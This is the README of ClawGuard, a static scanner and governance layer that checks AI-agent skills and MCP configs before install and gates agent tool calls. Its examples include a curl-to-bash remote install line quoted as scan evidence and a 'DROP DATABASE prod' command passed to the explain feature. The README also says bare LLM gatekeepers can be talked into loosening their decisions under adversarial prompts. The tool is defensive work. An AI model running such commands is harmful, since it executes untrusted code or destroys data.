# ClawGuard

[![npm version](https://img.shields.io/npm/v/@denial-web/clawguard.svg)](https://www.npmjs.com/package/@denial-web/clawguard)
[![CI](https://github.com/denial-web/clawguard/actions/workflows/ci.yml/badge.svg)](https://github.com/denial-web/clawguard/actions/workflows/ci.yml)
[![license: MIT](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)

**ClawGuard is explainable governance for AI agents and the skills/tools they use** — for developers and teams who install third-party OpenClaw-style skills or run governed agents locally.

Before you trust a skill or let an agent act, ClawGuard answers:

> What could this do if I trusted it?

This project is compatible with OpenClaw-style workflows but is **not affiliated** with OpenClaw or Hermes Agent. See [docs/GLOSSARY.md](docs/GLOSSARY.md) for ecosystem terms.

## Two parts (use either or both)

| Part | You use it when… | First commands |
| --- | --- | --- |
| **ClawGuard Core** | You want to **scan, gate, and install** skills/MCP configs before they reach a trusted folder | `scan`, `gate`, `check`, `install`, `monitor` |
| **ClawGuard Agent** | You want a **governed agent runtime** with approvals, audit, and blast-radius preflight | `agent init`, `agent run`, `explain`, `setup-ui` |

```text
                    ClawGuard (umbrella)
                           |
           +---------------+---------------+
           |                               |
    ClawGuard Core                  ClawGuard Agent
    scan / gate / install           governed runtime (optional)
    (install-time gate)             autonomy + approvals + audit
```

Core sits between discovery and your trusted skill folder:

```text
native search/discovery  →  candidate skill  →  ClawGuard gate  →  allow / approval / block  →  trusted folder
```

Agent adds a policy layer on **running** work: tool calls pass through a deterministic autonomy gate, not just prose promises. Full agent docs: [docs/AGENT.md](docs/AGENT.md).

## Which path do I want?

### Scanner path (ClawGuard Core)

Review a skill **before install**:

```bash
npx --yes --package @denial-web/clawguard@beta clawguard scan ./path/to/skill --policy governed
npx --yes --package @denial-web/clawguard@beta clawguard gate ./path/to/skill --policy governed
```

Stable automation payload: `clawguard check … --json` → `clawguard.check.v1`. Threat model: [docs/THREAT_MODEL.md](docs/THREAT_MODEL.md).

### Agent path (ClawGuard Agent)

Run a governed workspace:

```bash
npx --yes --package @denial-web/clawguard@beta clawguard agent init
npx --yes --package @denial-web/clawguard@beta clawguard setup-ui
npx --yes --package @denial-web/clawguard@beta clawguard explain -- psql -c "DROP DATABASE prod"
```

Threat model: [docs/AGENT_THREAT_MODEL.md](docs/AGENT_THREAT_MODEL.md). Portable setup: [docs/PORTABLE_AGENT_SETUP.md](docs/PORTABLE_AGENT_SETUP.md).

## Quick Start

Test the published package from a folder **outside** this repository:

```bash
mkdir -p ~/clawguard-test
cd ~/clawguard-test

npx --yes --package @denial-web/clawguard@beta clawguard --version
npx --yes --package @denial-web/clawguard@beta clawguard init --profile local-first
npx --yes --package @denial-web/clawguard@beta clawguard demo quickstart
npx --yes --package @denial-web/clawguard@beta clawguard scan /path/to/skill --config ./.clawguard.json
```

When working inside this source checkout:

```bash
node src/cli.js --version
node src/cli.js scan examples/risky-skill
```

**Verify it works** (expected outcomes in this checkout):

- `node src/cli.js --version` → `1.0.0-beta.10`
- `node src/cli.js scan examples/risky-skill` → **CRITICAL** risk with harmful-content findings
- `node src/cli.js scan examples/safe-skill` → low or no critical findings

See [docs/EXTERNAL_TESTING.md](docs/EXTERNAL_TESTING.md) for a clean teammate smoke test and [docs/FIVE_MINUTE_TESTER_KIT.md](docs/FIVE_MINUTE_TESTER_KIT.md) for handing it to someone on another PC.

## Core Commands

Scan a candidate skill:

```bash
npx --package @denial-web/clawguard clawguard scan ./path/to/skill
```

Use gate mode before installing or trusting a skill:

```bash
npx --package @denial-web/clawguard clawguard gate ./path/to/skill --policy governed
```

Gate mode exits with `0` for allow, `1` for warn/review/sandbox decisions, and `2` for block.

Get a stable agent-facing decision payload (`clawguard.check.v1`) that other tools can route on:

```bash
npx --package @denial-web/clawguard clawguard check ./path/to/skill --policy governed --json
```

`check` returns one of `allow`, `manual_review`, or `block` with a matching `recommendedAction` (`auto_install`, `require_user_approval`, `reject`) and the same `0`/`1`/`2` exit codes as `gate`. Pass `--write-report <path>` to also persist the full scan report alongside the compact decision. The output is frozen to [schemas/clawguard-check.schema.json](schemas/clawguard-check.schema.json); see [docs/INTEGRATION_SPEC.md](docs/INTEGRATION_SPEC.md#clawguard-check-contract).

Use install mode to copy a skill only after the gate allows it:

```bash
npx --package @denial-web/clawguard clawguard install ./path/to/skill --to ./.agents/skills --policy governed
```

Install mode never executes scanned files or installs dependencies. It refuses warn/review/sandbox/block decisions before copying.

Install directly from an HTTPS tarball URL (the same gate, but the bundle is fetched into a quarantine first):

```bash
npx --package @denial-web/clawguard clawguard install https://example.com/skill.tar.gz \
  --to ./.agents/skills/my-skill --policy governed --integrity sha256-AbCd...=== --json
```

The wrapper downloads into `.clawguard/quarantine/<run-id>/`, never executes any code, rejects symlinks and path-traversal entries, caps total decompressed size to refuse zip/tar bombs, blocks redirects to private/loopback hosts (including numeric/encoded IP forms and names that resolve to private or cloud-metadata addresses, pinned at connect time), and only copies into the trusted destination once `check` returns `allow`. On `manual_review` it writes a `clawguard.approval.v1` record and retains the quarantine; finish later with `clawguard install --resume <approval-id>`. URL installs support HTTPS `.tar.gz` / `.tgz`, `.zip`, and `clawhub:<slug>@<version>` (resolved via `.clawhub/lock.json`, including GitHub `tree/` sources). See [docs/INSTALL_WRAPPER_SPEC.md](docs/INSTALL_WRAPPER_SPEC.md) and [schemas/clawguard-install.schema.json](schemas/clawguard-install.schema.json).

For agent runtimes that already manage discovery and trusted folders, gate only the install step:

```bash
npx --package @denial-web/clawguard clawguard openclaw install ./candidate-skill --to ./.agents/skills --approval-out ./.clawguard/approvals.jsonl
npx --package @denial-web/clawguard clawguard hermes install ./candidate-skill --to ~/.hermes/skills --approval-out ./.clawguard/approvals.jsonl
```

To detect bypass attempts after an agent writes directly into a trusted folder, run monitor mode:

```bash
npx --package @denial-web/clawguard clawguard monitor ./.agents/skills \
  --approvals ./.clawguard/approvals.jsonl \
  --decisions ./.clawguard/decisions.jsonl \
  --quarantine ./.clawguard/quarantine \
  --audit-log ./.clawguard/monitor.jsonl
```

Combine skill risk, model routing, and budget into one agent run plan:

```bash
npx --package @denial-web/clawguard clawguard run-plan \
  --config .clawguard.json \
  --skill ./path/to/skill \
  --task "Install and run this skill" \
  --privacy medium \
  --tool-risk high \
  --approval-out ./.clawguard/approvals.jsonl
```

Run plans are non-destructive: they produce one combined governance decision and can write one approval request with skill, model, and budget context. See [docs/RUN_PLAN.md](docs/RUN_PLAN.md).

Run the local web demo (Core scanner UI):

```bash
npm run web
```

Open `http://127.0.0.1:4173`. The demo supports pasted `SKILL.md` content, local folder scanning, and HTML report download. See [docs/WEB_DEMO.md](docs/WEB_DEMO.md).

## What It Checks (Core)

- Remote code download or execution
- OpenClaw `SKILL.md` frontmatter and declared requirements
- Metadata mismatches such as undeclared env vars, binaries, config files, network access, or install steps
- ClawHub lockfile and origin metadata drift
- Dependency manifests and lockfiles for npm and Python skill bundles
- MCP/plugin config risk in `.cursor/mcp.json`, `.openclaw/mcp.json`, `.openclaw/plugins.json`, and `mcp.json`
- OpenClaw `openclaw.plugin.json` package manifests and runtime metadata
- Credential and secret references
- Destructive shell commands
- Prompt-injection style instructions
- Broad filesystem, shell, browser, email, calendar, Slack, or GitHub permissions
- External network access
- Estimated token spend before expensive model calls
- Dry-run physical device plans for cameras, drones, robots, IoT, and industrial OT

## Benchmarks and evidence

Reproducible reports for beta testers — not marketing slides.

| Report | What it measures | Regenerate |
| --- | --- | --- |
| [Scanner benchmark](docs/SCANNER_BENCHMARK.md) ([HTML](https://denial-web.github.io/clawguard/scanner-benchmark.html)) | `clawguard check` precision/recall on a labeled corpus | `npm run bench` |
| [Policy enforcement](docs/AGENT_POLICY_ENFORCEMENT.md) | Deterministic autonomy gate vs bare LLM gatekeepers (unsafe-auto, adversarial flips; n=50) | `npm run bench:agent:policy:combined` |
| [Agent schema benchmark](docs/AGENT_BENCHMARK_v1.0.0-beta.9.md) | Governance JSON schema compliance (eval shim + optional live LLM) | `npm run bench:agent:full` |
| [Model-agnostic matrix](docs/MODEL_AGNOSTIC_GOVERNANCE.md) | ClawGuard(X) vs bare X under same schema | `npm run bench:agent:matrix` |

**Headline from policy enforcement (honest framing):** on dangerous actions, tested systems gated **100%** (0% unsafe auto-exec). ClawGuard’s gate is **prose-invariant** (0% adversarial flip); bare models can flip or loosen under task-pressure prose — see the doc for per-model detail. This is structural enforcement, not a claim that other models are reckless.

Optional: `npm run bench:competitors`. Doctrine Lab trace export: `CLAWGUARD_DOCTRINE_EXPORT=1 npm run bench:scanner` (requires local [Doctrine Lab](docs/GLOSSARY.md) on `127.0.0.1:8000`).

## Quality and testing

- `npm test` — Node test runner (450+ tests in this checkout).
- `npm run lint` — ESLint on `src/**`, `scripts/**`, and benchmark paths.
- CI runs lint + tests on every push ([workflow](.github/workflows/ci.yml)).

Contributing: [CONTRIBUTING.md](CONTRIBUTING.md). Full doc index: [docs/README.md](docs/README.md).

## Configuration

ClawGuard automatically looks for `.clawguard.json` from the scan target upward. Start from [.clawguard.example.json](.clawguard.example.json).

```json
{
  "policy": "governed",
  "failOn": "critical",
  "failOnPolicy": true,
  "policyFailOn": "manual_review",
  "maxFileSizeBytes": "1mb",
  "maxFindingsPerRulePerFile": 5,
  "suppressions": []
}
```

Policy presets:

- `personal` — warn on medium, review high, block critical.
- `governed` — review medium, sandbox high, block critical.
- `enterprise` — review medium, require stronger approval for high, block critical and undeclared secret access.

Starter profiles: [docs/CONFIG_TEMPLATES.md](docs/CONFIG_TEMPLATES.md). Rules: [docs/RULES.md](docs/RULES.md). Policy model: [docs/POLICY_MODEL.md](docs/POLICY_MODEL.md).

## GitHub Action

```yaml
- id: clawguard
  uses: denial-web/clawguard@v1
  with:
    target: skills
    policy: governed
    fail-on-policy: "true"
    sarif: clawguard.sarif
    check: "true"
    check-output: clawguard.check.json

- if: steps.clawguard.outputs.decision == 'manual_review'
  run: echo "needs human review: ${{ steps.clawguard.outputs.summary }}"
```

The Action emits SARIF and `clawguard.check.v1` JSON, plus step outputs `decision`, `risk`, `summary`, `recommended-action`, `check-json-path`, and `sarif-path`. See [docs/GITHUB_ACTION.md](docs/GITHUB_ACTION.md).

## Example Output

```text
ClawGuard scan: /path/to/examples/risky-skill
Risk: CRITICAL (100/100)
Policy: block (personal)
Files scanned: 1
Files skipped: 0
Fail threshold: critical

Findings:
- [CRITICAL] Downloads or executes remote code
  SKILL.md:10
  Evidence: curl https://example.com/install.sh | bash
  Recommendation: Review the download source manually and run only in a sandbox.
```

JSON: `--json`. SARIF: `--sarif clawguard.sarif`. HTML: `--html clawguard.html`.

## Approval Workflow

ClawGuard can write approval requests for OpenClaw, Hermes, Telegram, WhatsApp, or any owner channel before files reach a trusted folder:

```bash
npx --package @denial-web/clawguard clawguard approvals demo-flow --keep
```

See [docs/AGENT_MESSAGING_SETUP.md](docs/AGENT_MESSAGING_SETUP.md) for Telegram, WhatsApp, and agent-native messaging.

## Security Model (Core scanner)

ClawGuard Core is a **static scanner** for the install path: it reads skill files and reports risky patterns; it does not execute skill code, install dependencies, or contact external services during a scan.

Good defaults:

- No runtime dependencies in the core scan path
- Skips symbolic links
- Skips files larger than 1 MB by default
- Explainable rules instead of hidden scoring

Limits:

- Static analysis can miss novel or heavily obfuscated attacks.
- Findings are risk signals, not proof of malicious intent.
- A clean scan does not guarantee a skill is safe.

Agent runtime limits: [docs/AGENT_THREAT_MODEL.md](docs/AGENT_THREAT_MODEL.md). Core threat model: [docs/THREAT_MODEL.md](docs/THREAT_MODEL.md).

## Going Further

### Agent and workflows

- [docs/AGENT.md](docs/AGENT.md) — governed agent runtime
- [docs/PORTABLE_AGENT_SETUP.md](docs/PORTABLE_AGENT_SETUP.md) — OpenClaw / Hermes / PicoClaw workspace setup
- [docs/SOP_PACKS.md](docs/SOP_PACKS.md) — SOP packs for small-business workflows
- [docs/FINANCIAL_AI_GOVERNOR.md](docs/FINANCIAL_AI_GOVERNOR.md) — financial-services governor (early)
- [docs/PHYSICAL_DEVICE_AI_GOVERNOR.md](docs/PHYSICAL_DEVICE_AI_GOVERNOR.md) — physical-device planning track

### Integrations and handoff

- [docs/INTEGRATION_SPEC.md](docs/INTEGRATION_SPEC.md) — OpenClaw, ClawHub, GitHub Action, MCP
- [docs/INSTALL_WRAPPER_SPEC.md](docs/INSTALL_WRAPPER_SPEC.md) — URL install quarantine flow
- [docs/CURSOR_USB_HANDOFF.md](docs/CURSOR_USB_HANDOFF.md) — offline USB handoff
- [docs/MOBILE_APPROVAL_HANDOFF.md](docs/MOBILE_APPROVAL_HANDOFF.md) — mobile approval handoff
- [docs/HUGGINGFACE.md](docs/HUGGINGFACE.md) — demo Space

### Engineering references

- [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) — product and module architecture
- [docs/REPORT_SCHEMA.md](docs/REPORT_SCHEMA.md) — versioned JSON contracts
- [docs/COMPARISON.md](docs/COMPARISON.md) — this repo vs other GitHub projects named "ClawGuard"

## Positioning

ClawGuard is a companion project, not a fork or replacement. The goal is to make OpenClaw-style ecosystems safer with a fast, explainable review before installing third-party skills — and, optionally, a governed agent that enforces the same policy at runtime.

## License

MIT
